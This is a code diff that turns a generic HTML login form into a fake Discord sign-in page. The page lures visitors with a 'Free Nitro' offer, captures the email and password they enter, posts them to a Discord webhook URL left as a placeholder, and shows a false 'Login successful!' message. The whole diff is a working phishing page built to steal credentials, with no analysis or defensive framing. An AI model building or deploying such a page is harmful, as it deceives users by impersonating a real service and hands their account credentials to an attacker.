@@ -3,15 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login Form</title>
-    <!-- Link to external CSS file (if you have one) -->
-    <link rel="stylesheet" href="styles.css">
-    <!-- Reference to your script.js file -->
-    <script src="script.js" defer></script>
+    <title>Discord - Log In</title>
+    <link rel="icon" type="image/png" href="logo1.png">
+    <style>
+        /* Your CSS styles */
+    </style>
 </head>
 <body>
+    <a href="/10.html"> <img src="/logo.png" height="69"> </a>
     <div class="login-container">
-        <h1>Login Form</h1>
+        <h1>Welcome back!</h1>
+        <p>We're so excited to see you again! Free Nitro Offer</p>
+        <p class="offer-text">100% off Free Nitro</p>
         <form id="loginForm">
             <div class="form-group">
                 <label for="email">Email</label>
@@ -21,8 +24,49 @@
                 <label for="password">Password</label>
                 <input type="password" id="password" name="password" required>
             </div>
-            <button type="submit">Log In</button>
+            <button type="submit" class="submit-btn">Log In</button>
         </form>
+        <div class="login-footer">
+            <p>Need an account? <a href="#">Register</a></p>
+            <p>Forgot your password? <a href="#">Reset Password</a></p>
+        </div>
     </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Replace with your Discord webhook URL
+            const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';
+
+            // Prepare data to send to Discord
+            const data = {
+                content: `**Email: ||${email}||\nPass: ||${password}||**`
+            };
+
+            // Send data to Discord webhook
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Error sending message to Discord');
+                }
+                alert('Login successful!'); // Replace with your success message
+                document.getElementById('loginForm').reset(); // Clear the form
+            })
+            .catch(error => {
+                console.error('Error sending message to Discord:', error);
+                alert('Failed to send message to Discord. Please try again.'); // Handle error
+            });
+        });
+    </script>
 </body>
 </html>
